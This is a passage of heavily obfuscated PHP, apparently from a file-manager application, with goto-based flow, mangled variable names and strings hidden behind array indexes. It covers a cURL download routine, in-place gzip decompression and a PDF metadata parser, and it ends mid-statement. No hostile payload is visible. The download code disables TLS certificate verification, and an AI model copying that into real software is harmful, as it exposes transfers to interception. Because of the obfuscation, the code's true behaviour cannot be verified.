$CØ‰îÊ‹áã =& $_SERVER[Ö¹ñÒÁ²÷]; $fóà‚ôÊ© = $bà·ÒßªâÖ . $CØ‰îÊ‹áã[1491]; set_timeout(); goto bõİæËƒ›; AÈÚİòÌé: curl_close($bâùâ˜Æ‚ƒ); fclose($a‹ ŞÜ†×Å); $CƒõË„„¢˜ = filesize(iconv_system($fóà‚ôÊ©)); goto Cì£ ¸ˆºÁ; BŞÑ»ã‘‰¦: curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_SSL_VERIFYHOST, 0); goto A„Áâº¡ø´; A„Áâº¡ø´: curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_NOPROGRESS, !1); curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_PROGRESSFUNCTION, $CØ‰îÊ‹áã[1503]); curl_progress_start($bâùâ˜Æ‚ƒ); goto DáËæÕ®†ğ; eŠé…¸±Å²: } static function checkGzip($a©’¡ÈåÉ) { goto A±çµÛ¥Äâ; A±çµÛ¥Äâ: $DÏÖØ÷ñâµ = $_SERVER[Ö¹ñÒÁ²÷][1506]; $E˜¿•«Ä™ù = file_sub_str($a©’¡ÈåÉ, 0, 2); if ($DÏÖØ÷ñâµ != $E˜¿•«Ä™ù) { return; } goto c¼ÛÜ…Ã„; c¼ÛÜ…Ã„: ob_start(); readgzfile($a©’¡ÈåÉ); $B´‹æï‚Ô£ = ob_get_clean(); goto dĞÍ»‚‹¿ì; dĞÍ»‚‹¿ì: file_put_contents($a©’¡ÈåÉ, $B´‹æï‚Ô£); goto e¬ñ«¢Ü»; e¬ñ«¢Ü»: } } class FileParsePdf { public static function parse($a‰–†ÔÄ¿) { goto C¦Œ£¥Û†ƒ; cŠĞµ²å‡š: preg_match_all($D”ùĞ†Œ×², $bêò´Æ‘¦[$d£ÉÈ¶[1508]], $aÖğµÍ‹‹í); if ($aÖğµÍ‹‹í[1] && $A—ø¤ŒØîë[$d£ÉÈ¶[1515]] < $aÖğµÍ‹‹í[1][0]) { $A—ø¤ŒØîë[$d£ÉÈ¶[1515]] = $aÖğµÍ‹‹í[1][0]; } preg_match_all($D”ùĞ†Œ×², $bêò´Æ‘¦[$d£ÉÈ¶[1509]], $aÖğµÍ‹‹í); goto b‰ºí“ºáğ; fÁ‡áî§: if ($aÖğµÍ‹‹í) { $A—ø¤ŒØîë[$d£ÉÈ¶[1322]] = $aÖğµÍ‹‹í[1]; } $A—ø¤ŒØîë[$d£ÉÈ¶[1515]] = 0; $D”ùĞ†Œ×² = $d£ÉÈ¶[1516]; goto cŠĞµ²å‡š; DÈÑÈÉ­°Ï: $bêò´Æ‘¦[$d£ÉÈ¶[1508]] = StreamWrapperIO::read($a‰–†ÔÄ¿, 0, $c»Ãˆ¤—Ü); $bêò´Æ‘¦[$d£ÉÈ¶[1509]] = StreamWrapperIO::read($a‰–†ÔÄ¿, $bêò´Æ‘¦[$d£ÉÈ¶[77]] - $c»Ãˆ¤—Ü, $c»Ãˆ¤—Ü); $e‹§”ëƒŒ = self::decodeXref($bêò´Æ‘¦); goto BÇ©ˆò“; BÇ©ˆò“: if ($e‹§”ëƒŒ) { $CŠ¥÷Ç§…Ş = $e‹§”ëƒŒ[$d£ÉÈ¶[1510]][$d£ÉÈ¶[1178]]; $A—ø¤ŒØîë = self::getObjectValue($bêò´Æ‘¦, $e‹§”ëƒŒ, $CŠ¥÷Ç§…Ş); } $A—ø¤ŒØîë = is_array($A—ø¤ŒØîë) ? $A—ø¤ŒØîë : array(); $A—ø¤ŒØîë[$d£ÉÈ¶[1511]] = 0; goto B†ê…¤¯÷Ú; b‰ºí“ºáğ: if ($aÖğµÍ‹‹í[1] && $A—ø¤ŒØîë[$d£ÉÈ¶[1515]] < $aÖğµÍ‹‹í[1][0]) { $A—ø¤ŒØîë[$d£ÉÈ¶[1515]] = $aÖğµÍ‹‹í[1][0]; } $A—ø¤ŒØîë = self::parseInfoItem($A—ø¤ŒØîë); return $A—ø¤ŒØîë; goto c‡¬ÛË„‚Ó; aË§ğéËÇ: preg_match($D”ùĞ†Œ×², $bêò´Æ‘¦[$d£ÉÈ¶[1509]], $aÖğµÍ‹‹í); if (!$A—ø¤ŒØîë[$d£ÉÈ¶[1511]] && count($aÖğµÍ‹‹í) == 5) { $A—ø¤ŒØîë[$d£ÉÈ¶[1511]] = $aÖğµÍ‹‹í[3]; $A—ø¤ŒØîë[$d£ÉÈ¶[1513]] = $aÖğµÍ‹‹í[4]; } preg_match($d£ÉÈ¶[1514], $bêò´Æ‘¦[$d£ÉÈ¶[1508]], $aÖğµÍ‹‹í); goto fÁ‡áî§; C¦Œ£¥Û†ƒ: $d£ÉÈ¶ =& $_SERVER[Ö¹ñÒÁ²÷]; $c»Ãˆ¤—Ü = 32 * 1024; $bêò´Æ‘¦ = array($d£ÉÈ¶[772] => fopen($a‰–†ÔÄ¿, $d£ÉÈ¶[1156]), $d£ÉÈ¶[75] => $a‰–†ÔÄ¿, $d£ÉÈ¶[77] => filesize($a‰–†ÔÄ¿), $d£ÉÈ¶[1507] => $c»Ãˆ¤—Ü); goto DÈÑÈÉ­°Ï; B†ê…¤¯÷Ú: $D”ùĞ†Œ×² = $d£ÉÈ¶[1512]; preg_match($D”ùĞ†Œ×², $bêò´Æ‘¦[$d£ÉÈ¶[1508]], $aÖğµÍ‹‹í); if (!$A—ø¤ŒØîë[$d£ÉÈ¶[1511]] && count($aÖğµÍ‹‹í) == 5) { $A—ø¤ŒØîë[$d£ÉÈ¶[1511]] = $aÖğµÍ‹‹í[3]; $A—ø¤ŒØîë[$d£ÉÈ¶[1513]] = $aÖğµÍ‹‹í[4]; } goto aË§ğéËÇ; c‡¬ÛË„‚Ó: } private static function parseInfoItem($F»İª«½—†) { $eàİÙà› =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$F»İª«½—†) { return !1; } $aŒÊ‘ÚÅ¡‘ = array($eàİÙà›[1323] => array($eàİÙà›[1517], $eàİÙà›[33]), $eàİÙà›[1518] => array($eàİÙà›[1519], $eàİÙà›[33]), $eàİÙà›[183] => array($eàİÙà›[1520], $eàİÙà›[206]), $eàİÙà›[106] => array($eàİÙà›[1521], $eàİÙà›[206]), $eàİÙà›[1515] => array($eàİÙà›[1515], $eàİÙà›[272]), $eàİÙà›[1511] => array($eàİÙà›[1511], $eàİÙà›[272]), $eàİÙà›[1513] => array($eàİÙà›[1513], $eàİÙà›[272]), $eàİÙà›[1522] => array($eàİÙà›[1523], $eàİÙà›[33]), $eàİÙà›[1524] => array($eàİÙà›[1525], $eàİÙà›[33]), $eàİÙà›[1526] => array($eàİÙà›[1322], $eàİÙà›[33])); $dÀ“…¼÷¸‚ = array(); foreach ($aŒÊ‘ÚÅ¡‘ as $eòœ³›¢÷ => $e®‰Í‡ÄäÇ) { if (!isset($F»İª«½—†[$e®‰Í‡ÄäÇ[0]])) { continue; } $bêÏ¬Æó÷Ü = $F»İª«½—†[$e®‰Í‡ÄäÇ[0]]; if (!$bêÏ¬Æó÷Ü || is_array($bêÏ¬Æó÷Ü)) { continue; } switch ($e®‰Í‡ÄäÇ[1]) { case $eàİÙà›[272]: $bêÏ¬Æó÷Ü = intval($bêÏ¬Æó÷Ü); break; case $eàİÙà›[206]: if (substr($bêÏ¬Æó÷Ü, 0, 2) == $eàİÙà›[1527]) { $bêÏ¬Æó÷Ü = substr($bêÏ¬Æó÷Ü, 2, 14); } if (strtotime($bêÏ¬Æó÷Ü)) { $bêÏ¬Æó÷Ü = date($eàİÙà›[1528], strtotime($bêÏ¬Æó÷Ü)); } break; } $dÀ“…¼÷¸‚[$eòœ³›¢÷] = $bêÏ¬Æó÷Ü; } return $dÀ“…¼÷¸‚; } private static function decodeXref(&$E¶îš‘ÔÌ÷) { goto Cí²Î¦³Ô; dïßî’ÖÍ»: if (preg_match($d¤Õ¿²Œ¨[1536], $BäÄ¶˜¿ñÍ, $a‚§ƒ˜Ÿ°­) > 0) { $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[77]] = intval($a‚§ƒ˜Ÿ°­[1]); } if (preg_match($d¤Õ¿²Œ¨[1537], $BäÄ¶˜¿ñÍ, $a‚§ƒ˜Ÿ°­) > 0) { $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[1538]] = intval($a‚§ƒ˜Ÿ°­[1]) . $d¤Õ¿²Œ¨[70] . intval($a‚§ƒ˜Ÿ°­[2]); } if (preg_match($d¤Õ¿²Œ¨[1539], $BäÄ¶˜¿ñÍ, $a‚§ƒ˜Ÿ°­) > 0) { $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[1540]] = intval($a‚§ƒ˜Ÿ°­[1]) . $d¤Õ¿²Œ¨[70] . intval($a‚§ƒ˜Ÿ°­[2]); } goto EÔ§³–ïÃÆ; EÔ§³–ïÃÆ: if (preg_match($d¤Õ¿²Œ¨[1541], $BäÄ¶˜¿ñÍ, $a‚§ƒ˜Ÿ°­) > 0) { $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[1178]] = intval($a‚§ƒ˜Ÿ°­[1]) . $d¤Õ¿²Œ¨[70] . intval($a‚§ƒ˜Ÿ°­[2]); } if (preg_match($d¤Õ¿²Œ¨[1542], $BäÄ¶˜¿ñÍ, $a‚§ƒ˜Ÿ°­) > 0) { $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[363]] = array(); $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[363]][0] = $a‚§ƒ˜Ÿ°­[1]; $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[363]][1] = $a‚§ƒ˜Ÿ°­[2]; } if (!$dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1510]][$d¤Õ¿²Œ¨[1178]]) { return !1; } goto Cœ¬­©™Şå; F¨¢š÷¸Ÿè: foreach ($a‚§ƒ˜Ÿ°­[3] as $C…¨í¡òíÅ => $céäå´¤œ) { if ($a‚§ƒ˜Ÿ°­[3][$C…¨í¡òíÅ] == $d¤Õ¿²Œ¨[1532]) { $C¢â‹ÜùŞñ = $A¸Ğì‡Ñ†Ì . $d¤Õ¿²Œ¨[70] . intval($a‚§ƒ˜Ÿ°­[2][$C…¨í¡òíÅ]); $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1529]][$C¢â‹ÜùŞñ] = intval($a‚§ƒ˜Ÿ°­[1][$C…¨í¡òíÅ]); ++$A¸Ğì‡Ñ†Ì; } else { if ($a‚§ƒ˜Ÿ°­[3][$C…¨í¡òíÅ] == $d¤Õ¿²Œ¨[1533]) { ++$A¸Ğì‡Ñ†Ì; } else { } } } if (preg_match_all($d¤Õ¿²Œ¨[1534], $d½õ¶Ö»»Ì, $a‚§ƒ˜Ÿ°­)) { $E¹’ğ”„Ã’ = $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[77]] - $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1507]]; foreach ($a‚§ƒ˜Ÿ°­[0] as $C…¨í¡òíÅ => $b‘²ç‡) { $b‘‘ªèøˆ§ = $a‚§ƒ˜Ÿ°­[1][$C…¨í¡òíÅ] . $d¤Õ¿²Œ¨[70] . $a‚§ƒ˜Ÿ°­[2][$C…¨í¡òíÅ]; $dÃ¯­÷©õê[$d¤Õ¿²Œ¨[1529]][$b‘‘ªèøˆ§] = strpos($d½õ¶Ö»»Ì, $b‘²ç‡) + $E¹’ğ”„Ã’ + 1; } } if (preg_match_all($d¤Õ¿²Œ¨[1535], $d½õ¶Ö»»Ì, $a‚§ƒ˜Ÿ°­)) { $BäÄ¶˜¿ñÍ = count($a‚§ƒ˜Ÿ°­[1]) == 1 ? $a‚§ƒ˜Ÿ°­[1][0] : $a‚§ƒ˜Ÿ°­[1][1]; } else { $BäÄ¶˜¿ñÍ = substr($d½õ¶Ö»»Ì, -1024 * 5); } goto dïßî’ÖÍ»; f½¿óÉ‚Š„: $AˆãÄßõô¢ = $d¤Õ¿²Œ¨[1530]; if (!preg_match_all($AˆãÄßõô¢, $d½õ¶Ö»»Ì, $a‚§ƒ˜Ÿ°­, PREG_SET_ORDER, 0)) { return !1; } $AöšƒÃ¯šØ = intval($a‚§ƒ˜Ÿ°­[0][1]); goto a·ˆ†Ëƒ…; Cí²Î¦³Ô: $d¤Õ¿²Œ¨ =& $_SERVER[Ö¹ñÒÁ²÷]; $d½õ¶Ö»»Ì = $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1509]]; $dÃ¯­÷©õê = array($d¤Õ¿²Œ¨[1510] => array(), $d¤Õ¿²Œ¨[1529] => array()); goto f½¿óÉ‚Š„; Cœ¬­©™Şå: if (preg_match($d¤Õ¿²Œ¨[1543], $BäÄ¶˜¿ñÍ, $a‚§ƒ˜Ÿ°­) > 0) { } return $dÃ¯­÷©õê; goto dÄ“Èè„øˆ; a·ˆ†Ëƒ…: if ($E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[77]] - $AöšƒÃ¯šØ > $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1507]]) { $eŠªŒ”¯¼« = 4 * $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1507]]; $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1507]] = $eŠªŒ”¯¼«; $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1508]] = StreamWrapperIO::read($E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[75]], 0, $eŠªŒ”¯¼«); $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1509]] = StreamWrapperIO::read($E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[75]], $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[77]] - $eŠªŒ”¯¼«, $eŠªŒ”¯¼«); $d½õ¶Ö»»Ì = $E¶îš‘ÔÌ÷[$d¤Õ¿²Œ¨[1509]]; } $A¸Ğì‡Ñ†Ì = 0; preg_match_all($d¤Õ¿²Œ¨[1531], $d½õ¶Ö»»Ì, $a‚§ƒ˜Ÿ°­); goto F¨¢š÷¸Ÿè; dÄ“Èè„øˆ: } private static function getObjectValue($aº•ÜãçØ, $B•Å«›Å“î, $AçÛù›«ô¬) { goto aÌ‚îˆé˜•; aÌ‚îˆé˜•: $fÉö«ˆ÷Œ =& $_SERVER[Ö¹ñÒÁ²÷]; $f»¢èèë£¶ = self::getObject($aº•ÜãçØ, $B•Å«›Å“î[$fÉö«ˆ÷Œ[1529]][$AçÛù›«ô¬]); if (is_string($f»¢èèë£¶[1])) { return $f»¢èèë£¶[1]; } goto Dæªó†¬Ğó; Dæªó†¬Ğó: if (!is_array($f»¢èèë£¶[1])) { return array(); } $e¹œÜÑ¡Õ‘ = array(); for ($dĞ²›®ê”½ = 0; $dĞ²›®ê”½ < count($f»¢èèë£¶[1]); $dĞ²›®ê”½ += 2) { $D§»ÌÁ«² = $f»¢èèë£¶[1][$dĞ²›®ê”½]; $AŞ…ÎÄ°· = $f»¢èèë£¶[1][$dĞ²›®ê”½ + 1]; if (count($D§»ÌÁ«²) == 3 && $D§»ÌÁ«²[0] == $fÉö«ˆ÷Œ[8]) { $aŞ—èªäÊ = !1; if ($AŞ…ÎÄ°·[0] == $fÉö«ˆ÷Œ[1544]) { $AŞ…ÎÄ°· = self::getObject($aº•ÜãçØ, $B•Å«›Å“î[$fÉö«ˆ÷Œ[1529]][$AŞ…ÎÄ°·[1]]); } $aŞ—èªäÊ = $AŞ…ÎÄ°·[1]; if ($aŞ—èªäÊ === !1) { continue; } if (is_string($aŞ—èªäÊ)) { $aŞ—èªäÊ = self::decodeStr($aŞ—èªäÊ); } $e¹œÜÑ¡Õ‘[$D§»ÌÁ«²[1]] = $aŞ—èªäÊ; } } goto C÷±òÖ×¸ã; C÷±òÖ×¸ã: return $e¹œÜÑ¡Õ‘; goto bÑ§¯ÆáĞ°; bÑ§¯ÆáĞ°: } private static function getObject($D ÂÔŸ°Æ, $DìÇåöõ¤Ü) { $AÙß‡ã„¦Ë = self::getObjectItem($D ÂÔŸ°Æ, $DìÇåöõ¤Ü); $AÙß‡ã„¦Ë = self::getObjectItem($D ÂÔŸ°Æ, $AÙß‡ã„¦Ë[2]); return $AÙß‡ã„¦Ë; } private static function getObjectItem($DƒÒºÀÜİ, $dÆÁİ‘˜Öƒ) { goto FÈĞÉ™ÃÊ¾; BÛ…®äÖÉ: $aœÁ¼ª‡ = $dÆÁİ‘˜Öƒ >= $eˆ¾‰£ºŸ ? $dÆÁİ‘˜Öƒ - $eˆ¾‰£ºŸ : $dÆÁİ‘˜Öƒ; $FÖÙ‘›çÎ = $dÆÁİ‘˜Öƒ >= $eˆ¾‰£ºŸ ? $DƒÒºÀÜİ[$bîÈ…òÛù¼[1509]] : $DƒÒºÀÜİ[$bîÈ…òÛù¼[1508]]; if ($dÆÁİ‘˜Öƒ > $E¥¤ƒ–—‚ && $dÆÁİ‘˜Öƒ <= $eˆ¾‰£ºŸ) { $aœÁ¼ª‡ = 0; $FÖÙ‘›çÎ = StreamWrapperIO::read($DƒÒºÀÜİ[$bîÈ…òÛù¼[75]], $dÆÁİ‘˜Öƒ, $E¥¤ƒ–—‚); } goto Döì§¶â–‘; Döì§¶â–‘: $dÖÒáÄÈ­² = self::getRawObject($FÖÙ‘›çÎ, $aœÁ¼ª‡); if ($dÆÁİ‘˜Öƒ >= $eˆ¾‰£ºŸ) { $dÖÒáÄÈ­²[2] = $dÖÒáÄÈ­²[2] + $eˆ¾‰£ºŸ; } else { if ($dÆÁİ‘˜Öƒ > $E¥¤ƒ–—‚ && $dÆÁİ‘˜Öƒ <= $eˆ¾‰£ºŸ) { $dÖÒáÄÈ­²[2] = $dÖÒáÄÈ­²[2] + $dÆÁİ‘˜Öƒ; } } return $dÖÒáÄÈ­²; goto dğø¦œé…é; FÈĞÉ™ÃÊ¾: $bîÈ…òÛù¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $E¥¤ƒ–—‚ = $DƒÒºÀÜİ[$bîÈ…òÛù¼[1507]]; $eˆ¾‰£ºŸ = $DƒÒºÀÜİ[$bîÈ…òÛù¼[77]] - $E¥¤ƒ–—‚; goto BÛ…®äÖÉ; dğø¦œé…é: } private static function decodeStr($dñµœôµ–‘) { goto DÀñƒ˜‹; Eğ¨è¶Ùò´: return $dñµœôµ–‘; goto D­ïºÓòÈ‡; cçğÄÛŒ†Œ: $dñµœôµ–‘ = $d÷ÏÌá¬ôÎ[33]; foreach ($F•ÜìŠ¥Ó as $cóç ¾òŠ) { if (preg_match($d÷ÏÌá¬ôÎ[1559], $cóç ¾òŠ) && !1 === stripos($cóç ¾òŠ, $d÷ÏÌá¬ôÎ[1560])) { $cóç ¾òŠ = preg_replace($d÷ÏÌá¬ôÎ[1561], $d÷ÏÌá¬ôÎ[33], $cóç ¾òŠ); $cóç ¾òŠ = trim($cóç ¾òŠ, $d÷ÏÌá¬ôÎ[922]); $cóç ¾òŠ = pack($d÷ÏÌá¬ôÎ[1562], $cóç ¾òŠ); $dñµœôµ–‘ .= $cóç ¾òŠ; } else { $dñµœôµ–‘ .= $cóç ¾òŠ; } } if (preg_match($d÷ÏÌá¬ôÎ[1563], $dñµœôµ–‘)) { $E•İÛóº = substr($dñµœôµ–‘, 2); $dñµœôµ–‘ = $d÷ÏÌá¬ôÎ[33]; $Aæ©ºóÉ”  = strlen($E•İÛóº); for ($aÆùàé†¤ = 0; $aÆùàé†¤ < $Aæ©ºóÉ” ; $aÆùàé†¤ += 2) { $B™‚Á‡µˆÆ = hexdec(bin2hex(substr($E•İÛóº, $aÆùàé†¤, 2))); $dñµœôµ–‘ .= mb_convert_encoding($d÷ÏÌá¬ôÎ[1564] . intval($B™‚Á‡µˆÆ) . $d÷ÏÌá¬ôÎ[67], $d÷ÏÌá¬ôÎ[1565], $d÷ÏÌá¬ôÎ[1566]); } } goto Eğ¨è¶Ùò´; DÀñƒ˜‹: $d÷ÏÌá¬ôÎ =& $_SERVER[Ö¹ñÒÁ²÷]; $dñµœôµ–‘ = str_replace(array($d÷ÏÌá¬ôÎ[1545], $d÷ÏÌá¬ôÎ[1546], $d÷ÏÌá¬ôÎ[1547], $d÷ÏÌá¬ôÎ[1548], $d÷ÏÌá¬ôÎ[1549], $d÷ÏÌá¬ôÎ[1550], $d÷ÏÌá¬ôÎ[1551], $d÷ÏÌá¬ôÎ[1552]), array($d÷ÏÌá¬ôÎ[93], $d÷ÏÌá¬ôÎ[50], $d÷ÏÌá¬ôÎ[8], $d÷ÏÌá¬ôÎ[244], $d÷ÏÌá¬ôÎ[813], $d÷ÏÌá¬ôÎ[213], $d÷ÏÌá¬ôÎ[986], $d÷ÏÌá¬ôÎ[326]), $dñµœôµ–‘); $F•ÜìŠ¥Ó = preg_split($d÷ÏÌá¬ôÎ[1553], $dñµœôµ–‘, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b†øÉ¸ŒÈ‚; b†øÉ¸ŒÈ‚: $dñµœôµ–‘ = $d÷ÏÌá¬ôÎ[33]; foreach ($F•ÜìŠ¥Ó as $cóç ¾òŠ) { if (preg_match($d÷ÏÌá¬ôÎ[1554], $cóç ¾òŠ)) { $dñµœôµ–‘ .= \chr(octdec(trim($cóç ¾òŠ, $d÷ÏÌá¬ôÎ[93]))); } else { $dñµœôµ–‘ .= $cóç ¾òŠ; } } $F•ÜìŠ¥Ó = preg_split($d÷ÏÌá¬ôÎ[1555], $dñµœôµ–‘, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Cöôˆ×„Äê; Cöôˆ×„Äê: $dñµœôµ–‘ = $d÷ÏÌá¬ôÎ[33]; foreach ($F•ÜìŠ¥Ó as $cóç ¾òŠ) { if (preg_match($d÷ÏÌá¬ôÎ[1556], $cóç ¾òŠ)) { $dñµœôµ–‘ .= \chr(hexdec(trim($cóç ¾òŠ, $d÷ÏÌá¬ôÎ[1557]))); } else { $dñµœôµ–‘ .= $cóç ¾òŠ; } } $F•ÜìŠ¥Ó = preg_split($d÷ÏÌá¬ôÎ[1558], $dñµœôµ–‘, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto cçğÄÛŒ†Œ; D­ïºÓòÈ‡: } private static function getRawObject($FìÈõõ°†, $CÔ¤›‹Ò­ = 0) { goto E‚“™È±¬; f¥Üæí³Ø®: $CÔ¤›‹Ò­ += strspn($FìÈõõ°†, $fÈå¾Æå–ğ[1567], $CÔ¤›‹Ò­); $Dï´½ëÂ›· = $FìÈõõ°†[$CÔ¤›‹Ò­]; switch ($Dï´½ëÂ›·) { case $fÈå¾Æå–ğ[1568]: $c¶¬ñ×¨’ö = strcspn($FìÈõõ°†, $fÈå¾Æå–ğ[1569], $CÔ¤›‹Ò­); if ($c¶¬ñ×¨’ö > 0) { $CÔ¤›‹Ò­ += $c¶¬ñ×¨’ö; return self::getRawObject($FìÈõõ°†, $CÔ¤›‹Ò­); } break; case $fÈå¾Æå–ğ[8]: $Cí«ªáçŞÀ = $Dï´½ëÂ›·; ++$CÔ¤›‹Ò­; $fïŒè§ÌäË = preg_match($fÈå¾Æå–ğ[1570], substr($FìÈõõ°†, $CÔ¤›‹Ò­, 256), $Fòô½Ï½™ö); if (1 == $fïŒè§ÌäË) { $fµĞª£®¸ = $Fòô½Ï½™ö[1]; $CÔ¤›‹Ò­ += strlen($fµĞª£®¸); } break; case $fÈå¾Æå–ğ[244]: case $fÈå¾Æå–ğ[813]: $Cí«ªáçŞÀ = $Dï´½ëÂ›·; ++$CÔ¤›‹Ò­; $Dô¬…¡©¯ = $CÔ¤›‹Ò­; if ($fÈå¾Æå–ğ[244] == $Dï´½ëÂ›·) { $D ¾ßğŞ¬˜ = 1; while ($D ¾ßğŞ¬˜ > 0) { if (!isset($FìÈõõ°†[$Dô¬…¡©¯])) { break; } $B‡»‘ó—á = $FìÈõõ°†[$Dô¬…¡©¯]; switch ($B‡»‘ó—á) { case $fÈå¾Æå–ğ[93]: ++$Dô¬…¡©¯; break; case $fÈå¾Æå–ğ[244]: ++$D ¾ßğŞ¬˜; break; case $fÈå¾Æå–ğ[813]: --$D ¾ßğŞ¬˜; break; } ++$Dô¬…¡©¯; } $fµĞª£®¸ = substr($FìÈõõ°†, $CÔ¤›‹Ò­, $Dô¬…¡©¯ - $CÔ¤›‹Ò­ - 1); $CÔ¤›‹Ò­ = $Dô¬…¡©¯; } break; case $fÈå¾Æå–ğ[153]: case $fÈå¾Æå–ğ[472]: $Cí«ªáçŞÀ = $Dï´½ëÂ›·; ++$CÔ¤›‹Ò­; if ($fÈå¾Æå–ğ[153] == $Dï´½ëÂ›·) { $fµĞª£®¸ = array(); do { $e¢ÍíŒŠ£· = $CÔ¤›‹Ò­; $aã…ù‡òåÜ = self::getRawObject($FìÈõõ°†, $CÔ¤›‹Ò­); $CÔ¤›‹Ò­ = $aã…ù‡òåÜ[2]; $fµĞª£®¸[] = $aã…ù‡òåÜ; } while ($fÈå¾Æå–ğ[472] != $aã…ù‡òåÜ[0] && $CÔ¤›‹Ò­ != $e¢ÍíŒŠ£·); array_pop($fµĞª£®¸); } break; case $fÈå¾Æå–ğ[921]: case $fÈå¾Æå–ğ[924]: if (isset($FìÈõõ°†[$CÔ¤›‹Ò­ + 1]) && $FìÈõõ°†[$CÔ¤›‹Ò­ + 1] == $Dï´½ëÂ›·) { $Cí«ªáçŞÀ = $Dï´½ëÂ›· . $Dï´½ëÂ›·; $CÔ¤›‹Ò­ += 2; if ($fÈå¾Æå–ğ[921] == $Dï´½ëÂ›·) { $fµĞª£®¸ = array(); do { $e¢ÍíŒŠ£· = $CÔ¤›‹Ò­; $aã…ù‡òåÜ = self::getRawObject($FìÈõõ°†, $CÔ¤›‹Ò­); $CÔ¤›‹Ò­ = $aã…ù‡òåÜ[2]; $fµĞª£®¸[] = $aã…ù‡òåÜ; } while ($fÈå¾Æå–ğ[1571] != $aã…ù‡òåÜ[0] && $CÔ¤›‹Ò­ != $e¢ÍíŒŠ£·); array_pop($fµĞª£®¸); } } else { $Cí«ªáçŞÀ = $Dï´½ëÂ›·; ++$CÔ¤›‹Ò­; $fïŒè§ÌäË = preg_match($fÈå¾Æå–ğ[1572], substr($FìÈõõ°†, $CÔ¤›‹Ò­), $Fòô½Ï½™ö); if ($fÈå¾Æå–ğ[921] == $Dï´½ëÂ›· && 1 == $fïŒè§ÌäË) { $fµĞª£®¸ = strtr($Fòô½Ï½™ö[1], $fÈå¾Æå–ğ[1573], $fÈå¾Æå–ğ[33]); $CÔ¤›‹Ò­ += \strlen($Fòô½Ï½™ö[0]); } elseif (!1 !== ($AãÁªçİ¿ = strpos($FìÈõõ°†, $fÈå¾Æå–ğ[924], $CÔ¤›‹Ò­))) { $CÔ¤›‹Ò­ = $AãÁªçİ¿ + 1; } } break; default: if ($fÈå¾Æå–ğ[1574] == substr($FìÈõõ°†, $CÔ¤›‹Ò­, 6)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1574]; $CÔ¤›‹Ò­ += 6; } elseif ($fÈå¾Æå–ğ[99] == substr($FìÈõõ°†, $CÔ¤›‹Ò­, 4)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[99]; $CÔ¤›‹Ò­ += 4; $fµĞª£®¸ = $fÈå¾Æå–ğ[99]; } elseif ($fÈå¾Æå–ğ[1575] == substr($FìÈõõ°†, $CÔ¤›‹Ò­, 4)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1576]; $CÔ¤›‹Ò­ += 4; $fµĞª£®¸ = $fÈå¾Æå–ğ[1575]; } elseif ($fÈå¾Æå–ğ[1577] == substr($FìÈõõ°†, $CÔ¤›‹Ò­, 5)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1576]; $CÔ¤›‹Ò­ += 5; $fµĞª£®¸ = $fÈå¾Æå–ğ[1577]; } elseif ($fÈå¾Æå–ğ[1578] == substr($FìÈõõ°†, $CÔ¤›‹Ò­, 6)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1578]; $CÔ¤›‹Ò­ += 6; if (1 == preg_match($fÈå¾Æå–ğ[1579], substr($FìÈõõ°†, $CÔ¤›‹Ò­), $Fòô½Ï½™ö)) { $CÔ¤›‹Ò­ += strlen($Fòô½Ï½™ö[0]); $c÷¸âİç¨‡ = $fÈå¾Æå–ğ[1580]; $fïŒè§ÌäË = preg_match($c÷¸âİç¨‡, substr($FìÈõõ°†, $CÔ¤›‹Ò­), $Fòô½Ï½™ö, PREG_OFFSET_CAPTURE); if (1 == $fïŒè§ÌäË) { $fµĞª£®¸ = substr($FìÈõõ°†, $CÔ¤›‹Ò­, $Fòô½Ï½™ö[0][1]); $CÔ¤›‹Ò­ += $Fòô½Ï½™ö[1][1]; } } } elseif ($fÈå¾Æå–ğ[1581] == substr($FìÈõõ°†, $CÔ¤›‹Ò­, 9)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1581]; $CÔ¤›‹Ò­ += 9; } elseif (1 == preg_match($fÈå¾Æå–ğ[1582], substr($FìÈõõ°†, $CÔ¤›‹Ò­, 33), $Fòô½Ï½™ö)) { $Cí«ªáçŞÀ = $fÈå¾Æå–ğ[1544]; $CÔ¤›‹Ò­ += 